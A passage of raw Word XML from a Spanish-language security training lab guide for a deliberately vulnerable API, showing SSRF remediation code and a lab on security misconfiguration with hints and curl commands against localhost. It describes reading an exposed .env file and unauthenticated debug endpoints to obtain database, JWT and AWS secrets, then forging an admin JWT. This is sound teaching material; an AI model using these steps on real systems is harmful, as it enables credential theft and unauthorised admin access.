        <w:t xml:space="preserve">    $ch = curl_init($webhook['url']);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_setopt($ch, CURLOPT_TIMEOUT, 5);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_exec($ch);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_close($ch);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // NUNCA devolver el cuerpo de la respuesta al usuario</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode([</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "status" =&gt; "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "test_result" =&gt; [</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "reachable" =&gt; ($http_code &gt;= 200 &amp;&amp; $http_code &lt; 300),</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "http_code" =&gt; $http_code,</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "message" =&gt; "Webhook probado exitosamente"</w:t>
        <w:br/>
        <w:t xml:space="preserve">            // NO incluir response_body ni effective_url</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ]</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ]);</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. Desactivar Redireccion DNS Rebinding</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// Proteccion adicional contra DNS rebinding</w:t>
        <w:br/>
        <w:br/>
        <w:t>function safeFetch(string $url): array {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // Resolver DNS primero</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $parsed = parse_url($url);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $resolved_ip = gethostbyname($parsed['host']);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Validar la IP resuelta</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (!validateExternalUrl("http://{$resolved_ip}/")) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return ['error' =&gt; 'IP resuelta no permitida'];</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Usar la IP resuelta directamente para evitar re-resolucion DNS</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $safe_url = str_replace($parsed['host'], $resolved_ip, $url);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    $ch = curl_init($safe_url);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Host: {$parsed['host']}"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_setopt($ch, CURLOPT_TIMEOUT, 5);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $response = curl_exec($ch);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $info = curl_getinfo($ch);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl_close($ch);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    return [</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'body' =&gt; $response,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'http_code' =&gt; $info['http_code']</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ];</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 08 - Configuracion de Seguridad Incorrecta</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Referencia OWASP: API8:2023 - Security Misconfiguration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Identificar y explotar multiples errores de configuracion de seguridad en la plataforma CryptoVulnX para:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Acceder a endpoints de depuracion que exponen credenciales de base de datos, secretos JWT y claves de AWS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Obtener el archivo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.env</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directamente desde el navegador.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Extraer informacion sensible de headers HTTP verbosos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Explotar la configuracion permisiva de CORS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Utilizar el secreto JWT para forjar tokens de administrador.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>La vulnerabilidad API8:2023 abarca un amplio espectro de errores de configuracion que exponen la API a ataques. Estos errores suelen ser resultado de configuraciones por defecto no endurecidas, funcionalidades de depuracion habilitadas en produccion, permisos excesivamente abiertos o headers informativos innecesarios.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>En CryptoVulnX, se encuentran las siguientes misconfiguraciones:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Endpoints de depuracion sin autenticacion</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: El panel </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v1/admin/debug.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> expone informacion del sistema (phpinfo, variables de entorno, credenciales de base de datos) sin requerir autenticacion alguna.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Archivo `.env` accesible via web</w:t>
      </w:r>
      <w:r>
        <w:t>: El archivo de variables de entorno que contiene todos los secretos esta accesible en la raiz del servidor web.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Headers HTTP verbosos</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Todas las respuestas incluyen </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Server-Version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Powered-By</w:t>
      </w:r>
      <w:r>
        <w:t>, revelando versiones exactas del software.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CORS permisivo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Todos los endpoints responden con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Access-Control-Allow-Origin: *</w:t>
      </w:r>
      <w:r>
        <w:t>, permitiendo que cualquier sitio web malicioso realice solicitudes a la API.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Errores SQL en modo debug</w:t>
      </w:r>
      <w:r>
        <w:t>: Los mensajes de error incluyen la consulta SQL completa, facilitando la construccion de inyecciones SQL.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Endpoints Involucrados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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Metodo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Endpoint / Vector</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Descripcion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/admin/debug.php?action=info</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Expone contrasena de BD, secreto JWT, version PHP (sin auth)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/admin/debug.php?action=env</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Variables de entorno: claves AWS, Stripe, etc. (sin auth)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/admin/debug.php?action=phpinfo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Salida completa de </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>phpinfo()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/.env</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Archivo de configuracion con secretos accesible via navegador</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>*</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Todos los endpoints</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Headers </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Server-Version</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Powered-By</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> en cada respuesta</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>*</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Todos los endpoints</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">CORS: </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Access-Control-Allow-Origin: *</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>*</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Cualquier query invalida</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Errores SQL en modo debug con texto completo de la consulta</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Dificultad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Baja</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Las misconfiguraciones son facilmente detectables con herramientas basicas o incluso un navegador web.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 1 - Reconocimiento</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Inspecciona los headers de respuesta de cualquier endpoint de la API. ¿Hay headers que revelen informacion sobre el servidor? Intenta acceder a rutas comunes de administracion como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v1/admin/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y archivos de configuracion como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/.env</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 2 - Enumeracion de endpoints de depuracion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">El endpoint </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v1/admin/debug.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> acepta un parametro </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>action</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> con diferentes valores. Prueba con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>info</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>env</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>phpinfo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Ninguno requiere autenticacion. Observa que </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>action=info</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> devuelve el secreto JWT (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>jwt_secret</w:t>
      </w:r>
      <w:r>
        <w:t>) utilizado para firmar todos los tokens.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 3 - Forjar un token de administrador</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Con el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>jwt_secret</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> obtenido del endpoint de debug, puedes crear un token JWT con el campo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>role</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> establecido en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Usa una herramienta como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>python -c "import jwt; ..."</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> o jwt.io para generar el token forjado y acceder a endpoints protegidos de administracion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1: Analizar Headers HTTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -I http://localhost/appsec/api/v1/auth/login.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada (headers relevantes):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>X-Server-Version: Apache/2.4.52</w:t>
        <w:br/>
        <w:t>X-Powered-By: PHP/8.1.2</w:t>
        <w:br/>
        <w:t>Access-Control-Allow-Origin: *</w:t>
        <w:br/>
        <w:t>Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS</w:t>
        <w:br/>
        <w:t>Access-Control-Allow-Headers: Content-Type, Authorization</w:t>
        <w:br/>
        <w:t>Content-Type: application/json</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Los headers revelan: version exacta de Apache y PHP, y CORS completamente abierto.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 2: Acceder al Endpoint de Debug - Informacion del Sistema</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s http://localhost/appsec/api/v1/admin/debug.php?action=info</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
